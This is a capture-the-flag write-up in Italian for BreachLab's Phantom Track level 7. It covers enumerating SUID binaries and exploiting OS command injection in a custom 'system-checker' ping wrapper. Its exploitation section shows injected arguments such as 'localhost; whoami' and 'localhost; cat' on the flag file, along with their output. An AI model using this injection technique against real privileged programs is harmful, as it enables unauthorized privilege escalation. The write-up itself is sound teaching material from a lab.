# Phantom Track - Phantom 7

## Sommario

- Track: Phantom Track
- Livello: Phantom 7 — Local Authority
- Fonte appunti: `phantom_track/phantom7/notes.md`
- Variante: censored (pubblicabile)

## Obiettivo

Dal BRIEFING del livello:

```text
MISSION: Local Authority
========================

A custom system utility runs with elevated privileges. It looks
safe. It takes a hostname argument and checks it.

Examine how it processes your input. What if the input is not a
hostname?

FLAG: owned by the user the SUID binary runs as (check `ls -l`
on the binary — it is not root).
```

Obiettivo: un binario custom SUID accetta un hostname come argomento; bisogna capire come lo elabora internamente e se è possibile forzarlo a eseguire comandi arbitrari con i suoi privilegi elevati.

## Ricognizione

Enumerazione dei binari SUID sul sistema:

```bash
find / -perm -4000 -exec ls -al {} \; 2>/dev/null
```

Tra i risultati, filtrando per il proprio livello:

```bash
find / -perm -4000 -exec ls -al {} \; 2>/dev/null | grep phantom7
-rwsr-x--- 1 flagkeeper7 phantom7 16224 May 28 16:07 /usr/local/bin/system-checker
```

Il binario `/usr/local/bin/system-checker` è SUID, di proprietà `flagkeeper7`, eseguibile dal gruppo `phantom7`. Interrogandolo:

```bash
/usr/local/bin/system-checker --help
[*] Checking host: --help
[-] Host is unreachable.
```

Il programma non riconosce `--help` come opzione: tratta letteralmente qualunque argomento come un hostname da controllare. Testando con un hostname valido:

```bash
/usr/local/bin/system-checker localhost
[*] Checking host: localhost
PING localhost(localhost (::1)) 56 data bytes
64 bytes from localhost (::1): icmp_seq=1 ttl=64 time=0.017 ms

--- localhost ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 ms
[+] Host is reachable.
```

Il comportamento conferma che il binario internamente invoca un comando di sistema `ping` sull'hostname fornito, mostrandone l'output grezzo.

## Tecnica

Il fatto che l'output di `ping` venga mostrato letteralmente suggerisce che l'argomento fornito dall'utente venga passato a una funzione come `system()` o `popen()`, probabilmente costruendo una stringa di comando tipo `ping -c 1 <input>` ed eseguendola tramite una shell. Se l'input non viene sanitizzato (niente whitelist di caratteri validi per hostname, nessun escaping dei metacaratteri di shell), è possibile iniettare un separatore di comando come `;` per concatenare un secondo comando arbitrario, che erediterà lo stesso EUID del processo — cioè quello del proprietario SUID del binario (`flagkeeper7`), non quello di chi lo esegue.

Questa è una classica **OS command injection** in un wrapper SUID.

## Sfruttamento

1. Test con un separatore di comando (`;`) per verificare se l'input viene passato a una shell senza sanitizzazione:

```bash
/usr/local/bin/system-checker 'localhost; whoami'
[*] Checking host: localhost; whoami
PING localhost(localhost (::1)) 56 data bytes
64 bytes from localhost (::1): icmp_seq=1 ttl=64 time=0.015 ms

--- localhost ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.015/0.015/0.015/0.000 ms
flagkeeper7
[+] Host is reachable.
```

Il comando `ping` viene eseguito normalmente su `localhost`, e subito dopo viene eseguito `whoami`, che stampa `flagkeeper7` — non l'utente reale che ha lanciato il binario. Questo conferma sia la command injection sia il fatto che il processo gira con l'EUID del proprietario SUID del binario.

2. Sostituzione del comando iniettato con la lettura diretta del file contenente la flag:

```bash
/usr/local/bin/system-checker 'localhost; cat /var/lib/phantom-flags/level7_flag'
[*] Checking host: localhost; cat /var/lib/phantom-flags/level7_flag
PING localhost(localhost (::1)) 56 data bytes
64 bytes from localhost (::1): icmp_seq=1 ttl=64 time=0.019 ms

--- localhost ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.019/0.019/0.019/0.000 ms
<REDACTED_FLAG>
[+] Host is reachable.
```

## Risultato

Sfruttando una command injection nel binario SUID `system-checker`, tramite l'iniezione di `; cat /var/lib/phantom-flags/level7_flag` nell'argomento hostname, è stato possibile eseguire un comando arbitrario con i privilegi del proprietario del binario (`flagkeeper7`), ottenendo la flag del livello:

```
<REDACTED_FLAG>
```

## Nota di pubblicazione

Questa è la versione pensata per pubblicazione su GitHub, secondo la dottrina BreachLab: il metodo (enumerazione dei binari SUID, individuazione della command injection tramite `;`, conferma con `whoami`, exploitation finale) è spiegato per intero — comandi, percorsi, nome del binario e sintassi restano in chiaro. È stato rimosso solo il valore letterale della flag finale.

## Crediti

Livello risolto su BreachLab — https://breachlab.org (Phantom Track). Writeup pubblicato nel rispetto delle regole della piattaforma: si insegna la tecnica, non si condivide la risposta.
